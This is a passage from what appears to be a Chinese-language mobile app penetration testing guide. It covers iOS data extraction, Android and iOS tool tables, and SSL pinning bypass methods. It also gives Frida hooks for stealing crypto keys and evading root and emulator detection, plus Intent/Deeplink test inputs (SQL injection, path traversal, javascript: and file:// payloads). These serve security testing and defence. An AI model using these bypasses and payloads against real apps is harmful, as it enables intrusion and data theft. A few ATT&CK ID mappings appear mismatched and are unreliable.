# 浏览器打开显示的 URL

# iOS 数据存储审计
# Keychain dump（见 2.2 节）
# CoreData 数据库（见 2.3 节）
# 应用沙箱完整检查
find /var/mobile/Containers/Data/Application/<UUID>/ -type f \( \
  -name "*.sqlite" -o -name "*.plist" -o -name "*.json" \
  -o -name "*.txt" -o -name "*.key" -o -name "*.pem" \
  -o -name "*.cer" -o -name "*.p12" \
\) 2>/dev/null

# iOS 备份分析
# 创建加密备份 -> 使用工具解密 -> 分析数据
# 工具: iMazing, Elcomsoft, 或 idevicebackup2
idevicebackup2 backup --full backup_dir/
# 分析备份数据中的敏感信息
```

---

## 速查表

### Android 安全测试工具矩阵

| 工具 | 类别 | 用途 | 关键命令 | 替代 |
|------|------|------|----------|------|
| apktool | 静态分析 | APK 反编译/重打包 | `apktool d app.apk -o out/` | androguard |
| jadx | 静态分析 | Java 反编译 | `jadx -d out/ app.apk` | cfr, procyon |
| MobSF | 自动化扫描 | 全自动安全分析 | `docker run -p 8000:8000 mobsf` | QARK, AndroBugs |
| Frida | 动态插桩 | 运行时 Hook | `frida -U -f com.app -l hook.js` | Xposed, EdXposed |
| Drozer | 动态测试 | IPC 漏洞扫描 | `drozer console connect` | ContentTool |
| Objection | 运行时探索 | 安全测试框架 | `objection -g "App" explore` | Passionfruit |
| Burp Suite | 流量分析 | HTTP(S) 代理 | 配置 WiFi 代理到 Burp | mitmproxy |
| adb | 设备管理 | Android 调试 | `adb shell am start -n ...` | 无 |
| dex2jar | 反编译 | DEX 转 JAR | `d2j-dex2jar.sh app.apk` | enjarify |
| baksmali | 反汇编 | DEX 反汇编 | `baksmali d app.apk -o out/` | smali |
| frida-dex-dump | 脱壳 | 内存 DEX dump | `frida-dex-dump -U -n App` | FDex2, FART |
| BlackDex | 脱壳 | 无 Root 脱壳 | 安装 APK 操作 | FDex2 |
| Magisk | Root | 系统 Root 管理 | Magisk Manager GUI | SuperSU |

### iOS 安全测试工具矩阵

| 工具 | 类别 | 用途 | 关键命令 | 替代 |
|------|------|------|----------|------|
| class-dump | 静态分析 | ObjC 头文件导出 | `class-dump -H Binary -o headers/` | dsdump |
| Frida | 动态插桩 | 运行时 Hook | `frida -U -n "App" -l hook.js` | Cycript |
| Objection | 运行时探索 | 安全测试框架 | `objection -g "App" explore` | iNalyzer |
| SSL Kill Switch 2 | SSL 绕过 | 全局 SSL Pinning 禁用 | Cydia 安装,重启 | Burp Mobile |
| Clutch | 解密 | IPA 解密 | `Clutch -d com.app` | bfdecrypt |
| Ghidra | 二进制分析 | Mach-O 反编译 | 导入 Mach-O 文件 | IDA Pro, Hopper |
| LLDB | 调试 | 原生调试器 | `lldb -> process connect` | GDB |
| Keychain-Dumper | 数据提取 | Keychain 导出 | `keychain_dumper` | Objection |
| idevicebackup2 | 备份 | 设备备份分析 | `idevicebackup2 backup dir/` | iMazing |
| cycript | 运行时 | ObjC/JS 交互 | `cycript -p TargetApp` | Frida |
| nm | 符号分析 | 符号表导出 | `nm -gU Binary` | otool |
| otool | 二进制分析 | Mach-O 分析 | `otool -L Binary` | ldid |
| plutil | plist 分析 | 属性列表查看 | `plutil -p Info.plist` | defaults |
| ldid | 签名 | 伪代码签名 | `ldid -S TargetApp` | codesign |

### SSL Pinning 绕过方法对照表

| 方法 | 平台 | 需 Root | 有效性 | 检测风险 | 说明 |
|------|------|---------|--------|----------|------|
| Frida Universal Bypass | Android/iOS | 是 | 高 | 中 | 通用脚本，Hook TrustManager |
| Objection sslpinning disable | Android/iOS | 是 | 高 | 中 | 一键绕过，支持多种库 |
| SSL Kill Switch 2 | iOS | 是(越狱) | 高 | 低 | 系统级绕过 |
| TrustMeAlready (Xposed) | Android | 是 | 高 | 低 | Xposed 模块 |
| network_security_config 修改 | Android | 否 | 高 | 无 | 需重打包 APK |
| Info.plist ATS 修改 | iOS | 否 | 中 | 无 | 需重打包 IPA |
| reFlutter | Android/iOS | 否 | 高 | 中 | Flutter 应用专用 |
| iptables 透明代理 | Android | 是 | 中 | 低 | 网络层拦截 |
| Custom Frida Script | Android/iOS | 是 | 最高 | 可控 | 精确 Hook 目标函数 |
| Burp Invisible Proxy | Android/iOS | 否 | 中 | 低 | 非透明代理模式 |

### Frida 常用 Hook 脚本速查

| 目标 | Hook 脚本片段 | 用途 |
|------|---------------|------|
| Java 方法参数 | `Java.use("Cls").method.implementation = function(a,b){console.log(a,b);return this.method(a,b);}` | 捕获输入输出 |
| 返回值修改 | `retval.replace(Java.use("java.lang.Boolean").valueOf(true));` | 强制返回 true |
| Native 函数 | `Interceptor.attach(Module.findExportByName("lib.so","func"),{onEnter:function(a){...}})` | Hook C/C++ |
| AES 密钥提取 | `Java.use("javax.crypto.spec.SecretKeySpec").$init.overload("[B","java.lang.String").implementation=function(k,a){console.log(hexdump(k));}` | 提取加密密钥 |
| WebView URL | `Java.use("android.webkit.WebView").loadUrl.implementation=function(u){console.log(u);this.loadUrl(u);}` | 监控 WebView |
| SharedPreferences | `Java.use("android.app.SharedPreferencesImpl").edit.implementation=function(){return this.edit();}` | 监控配置读写 |
| Root 检测绕过 | `Java.use("java.io.File").exists.implementation=function(){if(this.getPath().indexOf("su")>=0)return false;return this.exists();}` | 绕过 Root 检测 |
| 模拟器检测 | `Java.use("android.os.Build").FINGERPRINT.value="google/oriole/oriole:12/...";` | 伪造设备信息 |
| 字符串搜索 | `Java.perform(function(){Java.enumerateLoadedClasses({"onMatch":function(c){if(c.indexOf("target")>=0)console.log(c)},"onComplete":function(){}})})` | 运行时类搜索 |
| Intent 拦截 | `Java.use("android.app.Activity").getIntent.implementation=function(){var i=this.getIntent();console.log(i.toString());return i;}` | 捕获 Intent |

### Intent/Deeplink 测试命令表

| 测试项 | ADB/Drozer 命令 | 预期结果 | 漏洞类型 |
|--------|-----------------|----------|----------|
| 未导出 Activity | `adb shell am start -n com.app/.Admin` | 应拒绝访问 | 权限绕过 |
| WebView RCE | `am start -a android.intent.action.VIEW -d "scheme://open?url=javascript:alert(1)"` | 不应执行 JS | XSS/RCE |
| 本地文件读取 | `am start -a android.intent.action.VIEW -d "scheme://web?file=file:///etc/hosts"` | 不应展示文件 | 本地文件泄露 |
| SQL 注入 | `content query --uri "content://com.app.provider/users' OR 1=1--"` | 不应返回数据 | SQL 注入 |
| Deeplink 参数注入 | `am start -a android.intent.action.VIEW -d "scheme://api?endpoint=../../secret"` | 不应泄露数据 | 路径遍历 |
| PendingIntent 劫持 | `dz> run app.broadcast.send --action com.app.NOTIFICATION` | 不应泄露 Intent | PendingIntent 滥用 |
| Content Provider 遍历 | `dz> run scanner.provider.traversal -a com.app` | 不应访问任意文件 | 目录遍历 |
| 自定义权限绕过 | `adb shell am start -n com.app/.ProtectedActivity` | 应要求权限 | 权限绕过 |
| Deep Link 枚举 | `adb shell dumpsys package com.app \| grep -A5 scheme` | 记录所有 scheme | 攻击面枚举 |
| Task Affinity | `am start -n com.app.evil/.HijackActivity --taskAffinity com.app` | 应隔离任务栈 | Task 劫持 |

---

## MITRE ATT&CK 映射

| 战术 | 技术 | ID | 移动应用场景 |
|------|------|----|-------------|
| Initial Access | Exploit Public-Facing App | T1190 | Deeplink/Intent 漏洞利用 |
| Execution | User Execution | T1204 | 诱导用户点击恶意 Deeplink |
| Persistence | Scheduled Task/Job | T1053 | Android AlarmManager 持久化 |
| Privilege Escalation | Abuse Elevation Control | T1548 | Root 检测绕过、权限提升 |
| Defense Evasion | Impair Defenses | T1562 | SSL Pinning 绕过、Root 隐藏 |
| Credential Access | Credentials from Password Stores | T1552 | Keychain/SharedPreferences 提取 |
| Credential Access | Unsecured Credentials | T1552 | 硬编码凭证、日志泄露 |
| Discovery | Application Window Discovery | T1010 | UI 覆盖攻击 (Tapjacking) |
| Collection | Data from Local System | T1005 | SQLite/文件系统数据窃取 |
| Collection | Screen Capture | T1113 | 截屏数据泄露 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | 通过 HTTPS 隧道外发数据 |
| Command and Control | Encrypted Channel | T1573 | SSL Pinning 强制加密通信 |

---

## 前置条件

### 工具安装
- **Frida**: `pip install frida-tools objection`
- **apktool**: `brew install apktool` (macOS) 或下载 AOSP 预构建版本
- **jadx**: `brew install jadx` 或从 GitHub releases 下载
- **Drozer**: `pip install drozer`
- **MobSF**: Docker 安装或 `pip install mobsf`
- **Android SDK**: Android Studio 或 command-line tools
- **Burp Suite**: Community Edition (免费) 或 Professional

### 设备要求
- **Android**: Root 设备或模拟器 (Genymotion/AVD + Magisk)
- **iOS**: 越狱设备 (checkra1n/unc0ver) 或已配置的开发设备
- **网络**: 测试设备与分析机在同一网络 (或通过 USB adb reverse)

### 知识储备
- Android 四大组件（Activity、Service、Broadcast、Provider）
- iOS 应用生命周期与沙箱机制
- Java/Smali 基础（Android 逆向）
- Objective-C/Swift 基础（iOS 逆向）
- HTTP/HTTPS 协议与 TLS 握手
- Frida JavaScript API 基本用法

---

## Part C：2025-2026 精细化补充

### C.1 AI/LLM 辅助移动逆向

#### C.1.1 MCP (Model Context Protocol) + 逆向工具链

MCP 已成为 LLM 与逆向工程工具的标准集成协议，2025-2026 年主要发展：

```bash
# JADX-AI-MCP — LLM 驱动的 Android APK 分析
# GitHub: skywork.ai/jadx-ai-mcp
# 功能: LLM 集成反编译、自动化代码分析、漏洞模式识别
# 安装后可通过 Claude/Gemini 等 LLM 直接分析 APK
# jadx-ai-mcp --apk target.apk --prompt "分析此 APK 中的认证逻辑和硬编码凭证"

# GhidraMCP — 118+ AI 工具的 Ghidra MCP 服务器
# GitHub: 生态最成熟，支持反编译、交叉引用、批处理分析
# 支持 Docker 部署:
docker run -v /path/to/binary:/data ghidra-mcp:latest
# 集成后 LLM 可自动执行:
#   - 函数反编译与语义分析
#   - 跨版本函数匹配
#   - 自动注释与重命名
#   - 漏洞模式检测

# ReVa (Reverse Engineering Assistant)
# GitHub: cyberkaida/reverse-engineering-assistant
# 开源 Ghidra MCP 服务器，专为恶意软件分析设计
```

#### C.1.2 LLM 辅助移动逆向工作流

```bash
# RingZer0 2025 训练课程方法论
# 1. 使用 jadx 反编译 APK 获取 Java 源码
# 2. 通过 MCP 将反编译结果发送给 LLM
# 3. LLM 自动识别: 硬编码凭证、不安全加密、API 端点
# 4. 结合 Frida 动态验证 LLM 发现

# Cisco Talos LLM 逆向研究要点:
# - LLM 最擅长: 代码语义理解、模式识别、批量字符串分析
# - LLM 不擅长: 复杂控制流还原、加密算法逆向
# - 最佳实践: LLM 作为辅助而非替代，人工验证关键发现
```

### C.2 工具生态更新 (2025-2026)

#### C.2.1 Frida 17.x 更新

```bash
# Frida 17.6.0 (2026-01-18)
# 关键变更:
#   - QuickJS JavaScript 引擎持续优化
#   - watchOS/tvOS 新增支持
#   - Android 15/16 兼容性增强
#   - ARM64 库初始化器 Patch 支持 (NVISO 研究方法)

# 安装最新版
pip install --upgrade frida-tools  # 2026-06-01 最新发布

# NVISO ARM64 Library Initializer Patch 技术
# 解决某些加固应用的 library initializer 阻止 Frida 注入问题
# 原理: Patch ELF 的 DT_INIT_ARRAY 入口点，延迟初始化以允许 Frida 先注入
# 参考: blog.nviso.eu/2025/10/14/patching-android-arm64-library-initializers
```

#### C.2.2 jadx 1.5.5 更新

```bash
# jadx 1.5.5 (当前稳定版)
# 关键特性:
#   - 跨平台 .zip 分发包 (CLI + GUI)
#   - 47k+ GitHub Stars，Android 逆向事实标准
#   - 与 AI/MCP 集成的新生态 (JADX-AI-MCP)
#   - 反编译质量持续提升
# 安装:
brew install jadx  # macOS
# 或从 GitHub releases 下载: github.com/skylot/jadx/releases
```

#### C.2.3 Root 生态: Magisk vs KernelSU vs APatch

```bash
# 2026 年三大 Root 方案对比:

# Magisk (成熟稳定)
# - 生态最完善，模块兼容性最好
# - 内置 Zygisk 支持
# - 适合一般安全测试

# KernelSU (隐蔽性更强)
# - 基于 GKI Linux Kernel 5.10+
# - SUSFS 内核集成，Root 隐藏效果更好
# - 更适合绕过银行/金融类 App 的 Root 检测

# APatch (新兴替代)
# - Systemless 引导镜像 Patch
# - 与 KernelSU 类似的隐蔽性

# ZygiskNext — 独立 Zygisk 实现
# GitHub: Dr-TSNG/ZygiskNext
# 功能: 为 KernelSU 提供 Zygisk API 支持
#       也可替代 Magisk 内置 Zygisk
# 用途: 兼容 LSPosed/Xposed 模块生态

# Play Integrity 通过 (安全测试必需)
# 参考 XDA 指南: Basic/Device/Strong 三级验证通过方法
# xdaforums.com/t/guide-how-to-pass-strong-integrity-on-android
```

### C.3 Android 15/16 安全变更对渗透测试的影响

#### C.3.1 Android 16 (API 36) 关键变更

```bash
# Android 16 安全相关变更 (2025-2026):

# 1. 前台服务 (FGS) 限制加强
# - Android 15 引入更严格的 FGS 类型声明要求
# - 影响渗透测试中的后台持久化技术
# - 测试点: 应用是否正确声明 FGS 类型

# 2. 最低 API 级别强制 (API 24+)
# - Android 16 仅允许安装 target API 24+ 的应用
# - 影响: 旧版渗透测试工具可能无法安装
# - 解决方案: 确保工具 target API ≥ 24

# 3. 开发者验证要求 (2026-09 起)
# - 所有 Android 开发者必须向 Google 注册
# - 影响: 自定义渗透测试 APK 侧载可能受限
# - 注意: 安全研究豁免政策待确认

# 4. Private Space (隐私空间)
# - Android 15 内置类似 Secure Folder 功能
# - 测试点: 隔离环境数据泄漏、沙箱逃逸
# - 新攻击面: Private Space 边界检查

# 5. 安全补丁频率
# - CVE-2025-48595 被确认在野外积极利用 (Forbes 2026-06-02)
# - 安全补丁级别 2026-06-05 修复
# - 测试时需确认目标设备安全补丁级别
adb shell getprop ro.build.version.security_patch
```

### C.4 OWASP MASVS 2.0 / MASTG 更新

```bash
# OWASP MASVS 2.0 主要变更 (2025-2026):

# 1. 新增 MASVS-PRIVACY 类别
# - 独立的隐私控制要求
# - 覆盖: 数据最小化、用户同意、数据删除权

# 2. 新风险评分方案
# - 从二元通过/失败改为风险等级评分
# - 支持: 低/中/高/严重四级

# 3. MASTG Atomic Tests
# - 每个测试用例独立可执行
# - 支持自动化工具集成 (MobSF/Guardsquare AppSweep)

# 4. Flutter 专项: MASTG-TECH-0156
# - OWASP 官方 Flutter 逆向技术文档
# - 覆盖: Dart Snapshot 分析、AOT 反编译
# - 参考: mas.owasp.org/techniques/android/MASTG-TECH-0156/

# 自动化 MASVS 2.0 合规检查工具:
# - Guardsquare AppSweep (商业化)
# - Appknox (商业化)
# - Oversecured (商业化)
# - MobSF (开源，持续更新)
```

### C.5 2025-2026 关键移动安全 CVE 速查

#### C.5.1 Android 关键 CVE

| CVE | 组件 | CVSS | 描述 | 影响 |
|-----|------|------|------|------|
| CVE-2026-0073 | System | Critical | 无线调试 Zero-Click RCE | Android 14/15/16，远程 Shell 无需交互 |
| CVE-2025-48595 | Framework | Critical | 野外积极利用漏洞 | 2026-06 安全补丁修复 |
| CVE-2025-48633 | Framework | High | 信息泄露，已入 CISA KEV | Android 13-16 |
| CVE-2025-48593 | System | Critical | 近 10 亿设备受影响 | 2025-11 补丁修复 |
| CVE-2024-21633 | MobSF/Apktool | Critical | MobSF 通过 Apktool RCE | 影响 MobSF 内部 apktool 调用 |

#### C.5.2 iOS 关键 CVE

| CVE | 组件 | CVSS | 描述 | 发现者 |
|-----|------|------|------|--------|
| CVE-2025-14174 | iOS 内核 | Critical | 内存损坏 Zero-Day | Google TAG + Apple |
| iOS 26 多项 | 多组件 | Multiple | iOS 26 安全内容更新 | Apple |

#### C.5.3 移动应用安全态势 (Quokka 2026 报告)

```
# Quokka.io 2026 State of Mobile App Security Report:
# - 分析超 150,000 款移动应用
# - 523 个 Android 应用仍包含 2019 年披露的 Critical CVE
# - iOS 应用显示出不同但同样严重的未修补漏洞模式
# - 基础安全缺陷 (硬编码凭证、不安全存储) 仍然普遍
# 参考: quokka.io/blog/the-state-of-mobile-app-security-2026-report-findings
```

### C.6 Flutter 逆向最新进展

#### C.6.1 Blutter 工具更新

```bash
# Blutter — Flutter Dart 符号恢复工具
# 2025-2026 关键更新:
#   - 支持最新 Flutter 3.x/4.x 版本的 Dart Snapshot
#   - 改进的类/方法名恢复率
#   - 自动生成 Frida Hook 脚本 (支持 trace/modify/log)
#   - pp.txt 对象池分析增强

# OWASP MASTG-TECH-0156 推荐的 Flutter 逆向流程:
# 1. 检测: unzip -l app.apk | grep libapp.so
# 2. 提取: unzip -o app.apk lib/arm64-v8a/libapp.so
# 3. Blutter 分析: blutter lib/arm64-v8a/ output/
# 4. 字符串搜索: grep -i "auth\|token\|verify" output/pp.txt
# 5. Frida Hook: 使用 blutter 生成的脚本
# 参考: mas.owasp.org/techniques/android/MASTG-TECH-0156/
```

#### C.6.2 Guardsquare Flutter 逆向指南

```bash
# Guardsquare (DexGuard/ProGuard 厂商) Flutter 逆向前沿:
# - Dart AOT 编译后的 Snapshot 是主要分析目标
# - 工具链: Blutter + reFlutter + Frida 三件套
# - 新兴防护: 代码混淆、API Key 保护、Anti-Tampering
# - 保护建议: 使用 Guardsquare 的 Flutter 混淆方案
# 参考: guardsquare.com/blog/current-state-and-future-of-reversing-flutter-apps
```

### C.7 中文社区精华参考

| 来源 | 主题 | 链接 |
|------|------|------|
| 梆梆安全 | 2025年移动应用安全风险报告 | 基于全年威胁监测，系统梳理新型攻击技术演进与安全趋势 |
| 阿里云 | 移动应用安全加固服务 | Android/iOS/鸿蒙多维安全加固，防逆向防篡改 |
| 先知社区 | Android 逆向/移动安全 | xz.aliyun.com 技术文章，含 Frida Hook/脱壳/SO 分析 |
| 腾讯云 | CTF 移动安全 Android 题型解析 | 从入门到精通，覆盖静态/动态分析、iOS 安全 |
| 安全客 | 移动安全威胁追踪 | DarkSword iOS 漏洞利用工具 (2025-11 商业监控工具) |
| FreeBuf | APP 逆向百例实战 | jadx 反编译实战案例集 |
| 守夜人 | 移动安全攻防逆向大师课 (2025) | Hook、SO 分析、Unidbg、AOSP 定制、脱壳与安全检测 |
| 看雪 | 移动安全 + 逆向论坛 | Android/iOS 逆向实战分享 |

### C.8 防御升级路线图

#### P0 — 立即执行 (0-30天)

```bash
# 1. 确保安全补丁最新
adb shell getprop ro.build.version.security_patch
# CVE-2025-48595 已在野外利用，必须打补丁

# 2. 更新 Frida 到 17.6.0+
pip install --upgrade frida-tools

# 3. 检测硬编码凭证 (MobSF 自动化)
# 使用 MobSF v3.9+ 扫描所有移动应用
```

#### P1 — 短期优化 (30-90天)

```bash
# 1. 部署 OWASP MASVS 2.0 合规检查
# 使用 MobSF + MASTG Atomic Tests

# 2. SSL Pinning 强制执行
# 所有 API 通信必须启用 Certificate Pinning
# 推荐库: Android (TrustKit/Tamale), iOS (TrustKit)

# 3. Root/越狱检测增强
# 检测 KernelSU/APatch (不只是 Magisk)
# 使用 SafetyNet/Play Integrity API
```

#### P2 — 中期建设 (90-180天)

```bash
# 1. 集成 AI 辅助逆向检测
# GhidraMCP/JADX-AI-MCP 集成到安全审计流程
# 自动化硬编码凭证和 API Key 泄漏检测

# 2. Flutter 应用安全加固
# 代码混淆 (Dart tree-shaking + --obfuscate)
# libapp.so 加固 (商业方案)
# API Key 保护 (不在客户端存储)

# 3. 移动应用防篡改
# APK 签名方案 v3.1+
# SafetyNet Attestation API / Play Integrity API
```

#### P3 — 长期演进 (180天+)

```bash
# 1. Android 16 适配
# 确保应用兼容新的 FGS 限制和 API 24+ 要求
# 测试 Private Space 隔离边界

# 2. 移动安全态势管理
# 持续监控: Quokka/Oversecured/Appknox
# 建立移动应用漏洞 SLA

# 3. 红队移动攻击模拟
# 使用最新工具链验证防御:
#   - Frida 17.x + KernelSU (绕过 Root 检测)
#   - JADX-AI-MCP (自动化代码审计)
#   - MobSF + MASTG (合规检查)
#   - Burp Suite + SSL Pinning 绕过 (流量分析)
```

### C.9 MITRE ATT&CK 移动应用扩展映射

| 战术 | 技术 | ID | 2025-2026 新增场景 |
|------|------|----|--------------------|
| Initial Access | Exploit Public-Facing App | T1190 | Flutter Deeplink 漏洞、Android 16 新攻击面 |
| Execution | User Execution | T1204 | DarkSword iOS 商业监控工具利用链 |
| Defense Evasion | Impair Defenses | T1562 | KernelSU SUSFS 隐藏、Frida 17 ARM64 Patch |
| Discovery | Application Window Discovery | T1010 | Android Private Space 边界探测 |
| Credential Access | Credentials from Password Stores | T1552 | Quokka 报告: 523+ 应用仍含 2019 年 Critical CVE |
| Collection | Data from Local System | T1005 | Android 16 FGS 限制下的数据收集技术变化 |
